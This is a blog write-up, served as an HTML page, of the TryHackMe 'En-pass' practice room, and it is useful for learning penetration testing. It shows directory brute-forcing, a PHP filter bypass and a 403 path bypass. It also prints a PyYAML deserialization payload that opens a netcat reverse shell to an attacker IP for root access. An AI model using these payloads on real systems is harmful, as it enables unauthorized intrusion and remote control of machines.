@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Tryhackme En-pass | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Tryhackme En-pass | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Tryhackme En-pass" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here" />
+<meta property="og:description" content="Introduction This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/thm_en-pass/bg.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-14T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/thm_en-pass/bg.jpeg" />
+<meta property="twitter:title" content="Tryhackme En-pass" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Tryhackme En-pass","dateModified":"2021-02-14T00:00:00-06:00","description":"Introduction This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here","datePublished":"2021-02-14T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-tryhackme-en-pass/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-tryhackme-en-pass/","image":"/assets/thm_en-pass/bg.jpeg","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Tryhackme En-pass</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-14">14 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/thm_en-pass/bg.jpeg" alt="Tryhackme En-pass">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#nmap">Nmap</a></li>
+      <li><a href="#gobuster">gobuster</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploit">Exploit</a>
+    <ul>
+      <li><a href="#getting-password-and-username">Getting password and username</a></li>
+    </ul>
+  </li>
+  <li><a href="#gaining-access">Gaining access</a>
+    <ul>
+      <li><a href="#user">User</a></li>
+      <li><a href="#root">Root</a></li>
+    </ul>
+  </li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link <a href="https://tryhackme.com/room/enpass">here</a></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<p>what we have to do first is scanning the ip :</p>
+<pre><code>$ nmap -sC -sV -oA nm 10.10.144.190
+
+Nmap scan report for 10.10.144.190
+Host is up (0.33s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
+|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
+|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
+8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: En-Pass
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>as you can see we just have 2 port open which ssh and webserver. Now, lets take a look at webserver :</p>
+
+<p><img src="/assets/thm_en-pass/bg_1.jpeg" alt="img" /></p>
+
+<h3 id="gobuster">gobuster</h3>
+
+<p>We don’t find anything here, so let’s search some directories or file using the gobuster or wfuzz tools</p>
+<pre><code>$ gobuster dir -u http://10.10.88.227:8001/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.88.227:8001/
+[+] Threads:        10
+[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/02/14 22:32:30 Starting gobuster
+===============================================================
+/web (Status: 301)
+/reg.php (Status: 200)
+/403.php (Status: 403)
+/zip (Status: 301)
+Progress: 6719 / 220561 (3.05%)
+</code></pre>
+<p>after scanning we have 2 directory and 2 file .php. now lets check directory web :
+on this web directory we continue to search the directory until we find the key file</p>
+
+<pre><code>$ gobuster dir -u http://10.10.88.227:8001/web/resources/infoseek/configure/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.88.227:8001/web/resources/infoseek/configure/
+[+] Threads:        10
+[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/02/14 22:43:57 Starting gobuster
+===============================================================
+/key (Status: 200)
+Progress: 2214 / 220561 (1.00%)
+</code></pre>
+<p><img src="/assets/thm_en-pass/bg_2.jpeg" alt="img" /></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>now we have keys like id_rsa to get connected shell but the problem is we dont have password and username for the key. now lets go to /reg.php</p>
+
+<p><img src="/assets/thm_en-pass/bg_3.jpeg" alt="img" /></p>
+
+<p>then if found the source code of php, you can see the source code :</p>
+<pre><code class="language-bat"> &lt;?php
+if($_SERVER["REQUEST_METHOD"] == "POST"){
+   $title = $_POST["title"];
+   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
+          
+          $val = explode(",",$title);
+
+          $sum = 0;
+          
+          for($i = 0 ; $i &lt; 9; $i++){
+
+                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
+
+                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
+            
+                        $sum = $sum+ (bool)$val[$i]."&lt;br&gt;"; 
+                }   
+          
+          }
+
+          if ( ($sum) == 9 ){
+            
+
+              echo $result;//do not worry you'll get what you need.
+              echo " Congo You Got It !! Nice ";     
+            
+            }
+                    else{
+
+                      echo "  Try Try!!";
+
+                
+                    }
+          }
+        
+          else{
+            echo "  Try Again!! ";  
+          }     
+ 
+  }
+
+
+ 
+?&gt;
+</code></pre>
+<h3 id="getting-password-and-username">Getting password and username</h3>
+
+<p>after analyze the code we can exploit by putting alphanumeric characters which will break down some of our title variables into an array. In the code we have to be able to pass the title variable so that there will be 9 elements in the array. so in order to solve this we have to use 8 comma “,” in the title variable.</p>
+
+<p>so now I tried several possibilities and i can pass this with this code : <code>!!,!,!,!,!,!,!,$,@@@</code></p>
+
+<p>i will explain that why i’m using that code,You can see in the “(strlen ($ val [0]) == 2)” which means that in array 0 there must be 2 characters, the “(strlen ($ val [8]) == 3)” in the 8th array must have 3 characters and multiple checks like that.</p>
+
+<p><img src="/assets/thm_en-pass/bg_4.jpeg" alt="img" /></p>
+
+<blockquote>
+  <p>Note : You have to try it yourself and don’t copy the password from the picture or you’ll be a fool :D</p>
+</blockquote>
+
+<p>now we have password but not yet for the user, so lets go to /zip</p>
+
+<p><img src="/assets/thm_en-pass/bg_5.jpeg" alt="img" /></p>
+
+<p>So since I don’t want to spend my time looking at them one by one I will create a simple script to see all the files. this is the script that I use:</p>
+<pre><code>nano zip.sh
+
+for i in `seq 1 100`; do wget -q http://10.10.88.227:8001/zip/a$i.zip &amp;&amp; unzip a$i.zip &amp;&amp; cat a &amp;&amp; rm a &amp;&amp; rm a$i.zip; done
+
+</code></pre>
+
+<p><img src="/assets/thm_en-pass/bg_6.jpeg" alt="img" /></p>
+
+<p>as I guessed it is not useful at all :D, there everything outputing sadman . a bit annoying to someone make this box XD. now lets check 403.php
+<code>http://10.10.88.227:8001/403.php</code>
+<img src="/assets/thm_en-pass/bg_7.jpeg" alt="img" /></p>
+
+<p>i got nothing but thm tell us some hint</p>
+
+<p><img src="/assets/thm_en-pass/bg_8.jpeg" alt="img" /></p>
+
+<p>now I will check the end point with several possibilities using <a href="https://github.com/intrudir/403fuzzer">403fuzzer</a> such as X-Forwarded-For, besides this it also applies several different loads which are usually used in travesal dir or what we usually know wfuzz to each endpoint on the path</p>
+
+<blockquote>
+  <p>Note : This tool will check the endpoint with a couple of headers such as X-Forwarded-For It will also apply different payloads typically used in dir traversals path normalization etc. to each endpoint on the path. e.g. /%2e/test/test2 /test/%2e/test2 /test;/test2/</p>
+</blockquote>
+
+<pre><code>$ python3 403fuzzer.py -u http://10.10.88.227:8001/403.php -hc 403,404
+Response Code: 200      Length: 2563    Path: /
+Response Code: 200      Length: 2563    Path: /
+Response Code: 400      Length: 306     Path: /%2e%2e/403.php
+Response Code: 400      Length: 306     Path: /../403.php
+Response Code: 200      Length: 2563    Path: /
+Response Code: 400      Length: 306     Path: /%2e%2e/403.php
+Response Code: 400      Length: 306     Path: /../../../403.php
+Response Code: 400      Length: 306     Path: /../..//../403.php
+Response Code: 400      Length: 306     Path: /../../403.php
+Response Code: 400      Length: 306     Path: /../..;/403.php
+Response Code: 400      Length: 306     Path: /.././../403.php
+Response Code: 400      Length: 306     Path: /../.;/../403.php
+Response Code: 400      Length: 306     Path: /..//../../403.php
+Response Code: 400      Length: 306     Path: /..//../403.php
+Response Code: 400      Length: 306     Path: /../403.php
+Response Code: 400      Length: 306     Path: /../;/../403.php
+Response Code: 400      Length: 306     Path: /../;/403.php
+Response Code: 400      Length: 306     Path: //../../403.php
+Response Code: 400      Length: 306     Path: ///../403.php
+Response Code: 200      Length: 2563    Path: /
+Response Code: 200      Length: 2563    Path: /403.php%3b/%2e.
+Response Code: 200      Length: 2563    Path: /403.php%3b/..
+Response Code: 200      Length: 2563    Path: /403.php/%2e%2e
+Response Code: 200      Length: 2563    Path: /403.php/%2e%2e/
+Response Code: 200      Length: 2563    Path: /403.php/..
+Response Code: 200      Length: 2563    Path: /403.php/../
+Response Code: 400      Length: 306     Path: /403.php/../../
+Response Code: 400      Length: 306     Path: /403.php/../../../
+Response Code: 200      Length: 2563    Path: /403.php/../../..//
+Response Code: 200      Length: 2563    Path: /403.php/../..//
+Response Code: 400      Length: 306     Path: /403.php/../..//../
+Response Code: 400      Length: 306     Path: /403.php/.././../
+Response Code: 200      Length: 2563    Path: /403.php/../.;/../
+Response Code: 200      Length: 2563    Path: /403.php/..//
+Response Code: 200      Length: 2563    Path: /403.php/..//../
+Response Code: 400      Length: 306     Path: /403.php/..//../../
+Response Code: 200      Length: 2563    Path: /403.php/../;/../
+Response Code: 200      Length: 917     Path: /403.php/..;/
+Response Code: 200      Length: 2563    Path: /403.php//../../
+</code></pre>
+<p>as you can see we have different length <code>Response Code: 200      Length: 917     Path: /403.php/..;/</code> I just found this bypass which I think is a bit strange and confusing. however this is a challange and we must solve it :D.</p>
+
+<p><img src="/assets/thm_en-pass/bg_9.jpeg" alt="img" /></p>
+
+<h2 id="gaining-access">Gaining access</h2>
+
+<h3 id="user">User</h3>
+
+<p>now we got a username, so we have username and password for key lets jump in to ssh :</p>
+
+<p><img src="/assets/thm_en-pass/bg_10.jpeg" alt="img" /></p>
+
+<p>lets doing any privilage escalation, i was check it with linpeas but i’m not found any missconfiguration. so im using <a href="https://github.com/DominicBreuker/pspy">pspy</a> to snooping processes without root.</p>
+
+<blockquote>
+  <p>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p>
+</blockquote>
+
+<p>so im run this and i got any hint :</p>
+
+<p><img src="/assets/thm_en-pass/bg_11.jpeg" alt="img" /></p>
+
+<p>lets check <code>/opt/scripts</code> and alayze that :</p>
+
+<pre><code class="language-bat">bash-4.3$ cat file.py 
+#!/usr/bin/python
+import yaml
+
+
+class Execute():
+        def __init__(self,file_name ="/tmp/file.yml"):
+                self.file_name = file_name
+                self.read_file = open(file_name ,"r")
+
+        def run(self):
+                return self.read_file.read()
+
+data  = yaml.load(Execute().run())
+</code></pre>
+<p>im try to run this but it gives us below error :</p>
+
+<p><img src="/assets/thm_en-pass/bg_12.jpeg" alt="img" /></p>
+
+<p>which is where the error is due to the absence of the file.yml file. and im ask to uncle google and give me some suprise <a href="https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation">link</a>. lets check if its works or not :</p>
+<pre><code>bash-4.3$ python -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'
+EXPLOIT!
+bash-4.3$
+</code></pre>
+<p>and the example is works!!.</p>
+
+<h3 id="root">Root</h3>
+<p>let’s get the shell</p>
+
+<ul>
+  <li>first i’m create file.yml at /tmp :
+    <pre><code>!!python/object/new:os.system [rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.47.251 4444 &gt;/tmp/f ]
+</code></pre>
+  </li>
+  <li>now in attacker machines using <code>nc -lvnp 4444</code></li>
+  <li>lets run file.py and get a shell of root</li>
+</ul>
+
+<p><img src="/assets/thm_en-pass/bg_13.jpeg" alt="img" /></p>
+
+<p>and BOOMMM!! we got the root :D.</p>
+
+<p>Happy hacking :)</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Tryhackme En-pass&url=/writeup-tryhackme-en-pass/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-tryhackme-en-pass/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-tryhackme-en-pass/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Linux">Linux</a>                
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Tryhackme">Tryhackme</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#custom-exploitation">custom exploitation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#cve">cve</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#enumeration">enumeration</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#medium-box">medium-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#privilage-escalation">privilage escalation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-exploitation">web exploitation</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-hackerofthehill/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_hackerofthehill/bg.png" alt="Tryhackme hackerofthehill"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-hackerofthehill/">Tryhackme hackerofthehill</a>
+                
+                <div class="mb-2 mt-2 font-weight-normal">
+                <div class="rating-holder">
+<div class="c-rating c-rating--regular" data-rating-value="4.5">
+  <button>1</button>
+  <button>2</button>
+  <button>3</button>
+  <button>4</button>
+  <button>5</button>
+</div>
+</div>
+                </div>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">11 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-sustah/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_sustah/bg.png" alt="Tryhackme sustah"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-sustah/">Tryhackme sustah</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">05 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-loly/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_loly/bg.png" alt="Loly Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-loly/">Loly Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">02 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
